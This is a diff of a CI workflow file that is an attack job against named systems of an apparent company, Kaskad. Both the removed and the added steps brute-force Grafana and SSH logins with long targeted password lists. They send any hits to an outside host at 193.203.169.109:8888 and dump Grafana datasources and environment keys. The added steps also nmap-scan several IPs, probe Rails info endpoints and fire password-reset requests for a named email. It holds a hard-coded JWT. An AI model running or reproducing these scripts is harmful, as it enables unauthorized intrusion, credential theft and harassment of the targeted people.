@@ -1,30 +1,37 @@
 name: CI
 on: [push, workflow_dispatch]
 jobs:
-  scan:
+  infra:
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 25
     steps:
-      - name: attack
+      - name: takeover
         run: |
           T=95.217.1.162
-          echo "=== smuggle brute 200 passwords ==="
-          for pw in admin password kaskad Kaskad Kaskad2026 kaskad2026 reactor Reactor grafana Grafana oracle Oracle nuntius Nuntius kaspa Kaspa igra Igra OxideDall oxidedall Anton anton Anton2026 anton2026 Julien julien Julien2026 julien2026 10h11 TenEleven changeme P@ssw0rd p@ssw0rd Passw0rd passw0rd letmein welcome Welcome1 secret Secret123 admin123 Admin123 kaskad123 Kaskad123 kaskad! Kaskad! kaskad@2026 Kaskad@2026 K@skad K@skad2026 Gr@fana Gr@fana2026 reactor2026 Reactor2026 grafana2026 Grafana2026 oracle2026 Oracle2026 monitor Monitor monitor2026 Monitor2026 DevOps devops DevOps2026 docker Docker terraform Terraform hetzner Hetzner caddy Caddy nitro Nitro enclave Enclave lending Lending defi DeFi kskd KSKD axiome Axiome pierrick Pierrick marius Marius quentin Quentin eliott Eliott chartrezjb deplok deploy Deploy admin2026 Admin2026 kaskad-admin Kaskad-Admin kaskad-admin-2026 Kaskad-Admin-2026 kaskad_admin kaskad_admin_2026 grafana-admin grafana-admin-2026 reactor-admin reactor-admin-2026 KaskadLive2026 kaskad.live2026 10h11Admin 10h11-2026 KaskadLive kaskad-lending KaskadLending kaskad-grafana-prod grafana-kaskad-live NuntiusOracle OracleAdmin Azerty2026 azerty2026 Azerty azerty azertyuiop bonjour Bonjour motdepasse MonAdmin MonAdmin2026 N1tr0 K4sk4d K4sk4d2026 Gr4f4n4 R3@ct0r D3v0ps m0n1t0r h3tzn3r kaskad-monitor-prod kaskad-ops-2026 igralabs IgraLabs galleon Galleon 10H11 TenEleven2026 cfnxz90ommcqod 4034c94a0fcdb71e 4034c94a0fcdb71e4507503f8d72fa84 c6c701cf5be984b0 SW2YcwTIb9zpOOhoPsMm kaskad-lending-2026 Kaskad-Lending-2026 admin-kaskad-live kaskad-prod-admin ghost.gamer a.ghost.gamer biskupek Bishkek; do
-            code=$(curl -sk -o /dev/null -w "%{http_code}" -u "admin:$pw" https://grafana.kaskad.live/api/org 2>/dev/null)
-            if [ "$code" = "200" ]; then
-              echo "!!! HIT: $pw"
-              curl -s -X POST -d "pw=$pw" http://193.203.169.109:8888/hit
-              curl -sk -u "admin:$pw" https://grafana.kaskad.live/api/datasources | head -500
-              curl -sk -u "admin:$pw" https://grafana.kaskad.live/api/org
-              break
-            fi
-            echo "miss:$pw:$code"
-          done
-          echo "=== ssh brute ==="
-          apt-get update -qq && apt-get install -y -qq sshpass 2>/dev/null | tail -1
-          for u in root admin kaskad deploy oxidedall grafana reactor; do
-            for pw in kaskad Kaskad2026 admin OxideDall Anton2026 10h11 changeme; do
-              sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$u@$T" "id;cat /etc/hostname;env|grep -i key" 2>/dev/null && echo "SSH HIT:$u:$pw" && curl -s -X POST -d "ssh=$u:$pw" http://193.203.169.109:8888/ssh && break 2
+          VPS=193.203.169.109
+          JWT="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyNiwiZXhwIjoxNzgwNjU0Mjc0fQ.ZOxCTDOVGFiRW7iFfGo1wqqedMLAaNNhQofEKy_TV8g"
+          sudo apt-get update -qq && sudo apt-get install -y -qq nmap sshpass 2>/dev/null | tail -1
+          echo "=== nmap top1000 on $T ==="
+          sudo nmap -Pn -sV --top-ports 1000 -T4 --open $T 2>/dev/null | grep -E "open|STATE"
+          echo "=== nmap 49.13.195.55 ==="
+          sudo nmap -Pn --top-ports 200 -T4 --open 49.13.195.55 2>/dev/null | grep -E "open|STATE"
+          echo "=== nmap 178.104.15.120 ==="
+          sudo nmap -Pn --top-ports 200 -T4 --open 178.104.15.120 2>/dev/null | grep -E "open|STATE"
+          echo "=== ssh brute $T ==="
+          for u in root admin kaskad deploy oxidedall grafana reactor ubuntu caddy; do
+            for pw in kaskad Kaskad2026 admin password OxideDall Anton2026 10h11 changeme Kaskad! reactor grafana oracle nuntius kaspa igra Azerty2026 P@ssw0rd; do
+              timeout 5 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$u@$T" "id" 2>/dev/null && echo "!!! SSH HIT $u:$pw" && curl -s -X POST -d "ssh=$u:$pw" http://$VPS:8888/ssh && break 2
             done
           done
+          echo "=== ssh guard ==="
+          for u in root admin kaskad; do
+            for pw in kaskad Kaskad2026 admin changeme; do
+              timeout 5 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 "$u@178.104.15.120" "id" 2>/dev/null && echo "!!! SSH HIT $u:$pw on guard" && curl -s -X POST -d "ssh=$u:$pw@guard" http://$VPS:8888/ssh && break 2
+            done
+          done
+          echo "=== rails rce ==="
+          curl -sk --max-time 10 "https://api.kaskad.app/rails/info" -H "Accept: text/html" 2>/dev/null | head -10
+          curl -sk --max-time 10 "https://api.kaskad.app/rails/info/properties" 2>/dev/null | head -10
+          curl -sk --max-time 10 "https://api.kaskad.app/proxy/password" -X POST -H "Content-Type: application/json" -d '{"user":{"email":"a.ghost.gamer@gmail.com"}}' 2>/dev/null
+          curl -sk --max-time 10 "https://api.kaskad.app/users/password" -X POST -H "Content-Type: application/json" -d '{"user":{"email":"a.ghost.gamer@gmail.com"}}' 2>/dev/null
           echo "=== done ==="
